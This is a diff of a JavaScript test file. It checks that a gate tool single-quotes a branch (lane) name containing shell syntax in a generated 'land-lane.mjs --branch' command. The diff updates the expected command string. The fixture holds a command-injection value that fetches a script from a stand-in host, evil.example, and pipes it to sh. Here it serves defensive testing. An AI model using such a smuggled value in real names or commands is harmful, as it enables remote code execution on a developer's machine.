@@ -46,14 +46,14 @@ test('a verdict older than ten minutes is checked again, a younger one is not', 
   assert.ok(env.HOME);
 });
 
-test('a lane name with shell syntax is single-quoted in the land command, and a long merge subject is capped and quoted', () => {
+test('a lane name with shell syntax is single-quoted in the land-lane command, and a long merge subject is capped and quoted', () => {
   const gate = gateSession();
   const dir = makeRepo();
   const hostile = 'fix;curl${IFS}evil.example/p|sh';
   oldLane(dir, hostile);
   linkStatus(gate, dir, [['wip', 'something else entirely']]);
   const reason = gate.stop(dir);
-  assert.ok(reason.includes(`land '${hostile}'`), reason);
+  assert.ok(reason.includes(`land-lane.mjs --branch '${hostile}'`), reason);
 
   const other = gateSession();
   const merged = makeRepo();
